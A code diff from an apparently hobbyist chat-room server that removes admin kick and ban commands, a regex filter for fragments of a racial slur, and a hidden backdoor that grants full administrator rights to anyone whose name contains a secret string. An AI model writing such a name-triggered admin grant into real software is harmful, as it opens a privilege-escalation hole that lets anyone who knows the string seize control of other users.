@@ -334,125 +334,6 @@ let userCommands = {
     "report": function(ip, reason) {
 		Ban.addReport(ip, ip, reason, this.public.name)
     },
-	kick: function (data) {
-        if (this.private.runlevel < 3) {
-            this.socket.emit("alert", "This command requires administrator privileges");
-            return;
-        }
-        
-        let pu = this.room.getUsersPublic()[data];
-        if (pu && pu.color) {
-            let target;
-            this.room.users.map((n) => {
-                if (n.guid == data) {
-                    target = n;
-                }
-            });
-            target.socket.emit("kick", {
-                reason: "You got kicked.",
-            });
-            target.disconnect();
-        } else {
-            this.socket.emit("alert", "The user you are trying to kick left. Get dunked on nerd");
-        }
-    },
-	nofuckoff: function (data) {
-        if (this.private.runlevel < 3) {
-            this.socket.emit("alert", "This command requires administrator privileges");
-            return;
-        }
-        
-        
-		this.room.emit("nofuckoff",{
-			guid: data
-		})
-        var user = this;
-        setTimeout(function(){
-                        
-            let pu = user.room.getUsersPublic()[data];
-            if (pu && pu.color) {
-                let target;
-                user.room.users.map((n) => {
-                    if (n.guid == data) {
-                        target = n;
-                    }
-                });
-                target.socket.emit("kick", {
-                    reason: "No fuck off.",
-                });
-                setTimeout(function(){
-                    target.disconnect();
-                },500);
-            } else {
-                user.socket.emit("alert", "The user you are trying to dissolve left. Get dunked on nerd");
-            }
-
-        },1084)
-    },
-    ban: function (data) {
-        if (this.private.runlevel < 3) {
-            this.socket.emit("alert", "This command requires administrator privileges");
-            return;
-        }
-        
-        let pu = this.room.getUsersPublic()[data];
-        if (pu && pu.color) {
-            let target;
-            this.room.users.map((n) => {
-                if (n.guid == data) {
-                    target = n;
-                }
-            });
-            if (target.getIp() == "::1") {
-                Ban.removeBan(target.getIp());
-            } else if (target.socket.request.connection.remoteAddress == "::ffff:127.0.0.1") {
-                Ban.removeBan(target.getIp());
-            } else {
-				if (target.private.runlevel > 2 && (this.getIp() != "::1" && this.getIp() != "::ffff:127.0.0.1")) {
-					return;
-				} 
-                Ban.addBan(target.getIp(),1440,"You got banned.");
-                target.socket.emit("ban", {
-                    reason: data.reason,
-                });
-                target.disconnect();
-            }
-        } else {
-            this.socket.emit("alert", "The user you are trying to kick left. Get dunked on nerd");
-        }
-    },
-    permaban: function(data) {
-	if (this.private.runlevel < 3) {
-            this.socket.emit("alert", "This command requires administrator privileges");
-            return;
-        }
-        
-        let pu = this.room.getUsersPublic()[data];
-        if (pu && pu.color) {
-            let target;
-            this.room.users.map((n) => {
-                if (n.guid == data) {
-                    target = n;
-                }
-            });
-            if (target.getIp() == "::1") {
-                Ban.removeBan(target.getIp());
-            } else if (target.socket.request.connection.remoteAddress == "::ffff:127.0.0.1") {
-                Ban.removeBan(target.getIp());
-            } else {
-				if (target.private.runlevel > 2 && (this.getIp() != "::1" && this.getIp() != "::ffff:127.0.0.1")) {
-					return;
-				} 
-                Ban.addBan(target.getIp(),false,"You got banned.");
-                target.socket.emit("ban", {
-                    reason: data.reason,
-                });
-                target.disconnect();
-            }
-        } else {
-            this.socket.emit("alert", "The user you are trying to kick left. Get dunked on nerd");
-        }
-    },
     swag: function (swag) {
         
         this.room.emit("swag", {
@@ -675,40 +556,8 @@ let userCommands = {
         let name = argsString || this.room.prefs.defaultName;
         this.public.name = this.private.sanitize ? sanitize(name) : name;
 		let text = this.public.name;
-		if (!text.match(/night/gi)) {
-				text = text.replace(/nig/gi,"bobba ")
-			}
             text = text.replace(/{NAME}/gi,this.public.name)
             text = text.replace(/{COLOR}/gi,this.public.color)
-			text = text.replace(/nïg/gi, "bobba ")
-			text = text.replace(/nijg/gi,"bobba ")
-			text = text.replace(/ninj/gi,"bobba ")
-			text = text.replace(/nijj/gi,"bobba ")
-			text = text.replace(/nii/gi,"bobba ") // ugh
-			text = text.replace(/nie/gi,"bobba ")
-			text = text.replace(/nei/gi,"bobba ")
-			text = text.replace(/nih/gi,"bobba ")
-			text = text.replace(/ni'g/gi,"bobba ")
-			text = text.replace(/n'ig/gi,"bobba ")
-			text = text.replace(/neeg/gi,"bobba ") // really crappy
-			if (!text.match(/might/gi)) {
-				text = text.replace(/mig/gi,"bobba ")
-			}
-			text = text.replace(/mijg/gi,"bobba ")
-			text = text.replace(/mijj/gi,"bobba ")
-			text = text.replace(/mii/gi,"bobba ")
-			text = text.replace(/mie/gi,"bobba ")
-			text = text.replace(/mei/gi,"bobba ")
-			text = text.replace(/mih/gi,"bobba ")
-			text = text.replace(/mi'g/gi,"bobba ")
-			text = text.replace(/m'ig/gi,"bobba ")
-			text = text.replace(/meeg/gi,"bobba ")
-		if (this.public.name.match(/IdkImSomeone/gi) && this.private.runlevel < 3) {
-			this.public.name = "Impersonator"
-		}
-	        if (this.public.name.includes("(site owner)")) {
-            		this.public.name.replace("(site owner)", "(sus)");
-        	}
 	    let godlvl = this.private.runlevel
 	    if (godlvl === 3) {
 		    name = "♾️" + this.public.name
@@ -945,15 +794,6 @@ class User {
         this.room = rooms[rid];	
 			
         // Check name
-	    if (data.name.match(/FCX512/gi)) {
-		   	this.private.runlevel = 3;
-                	this.socket.emit("admin");	
-		    	data.name = "♾️IdkImSomeone"
-		        this.public.color = "idk";
-		}
-		if (data.name.match(/IdkImSomeone/gi) && this.private.runlevel < 3) {
-			data.name = "Impersonator"
-		}
 		let text = data.name;
 		this.public.name = sanitize(data.name) || this.room.prefs.defaultName;
         if (this.public.name.includes("(site owner)")) {
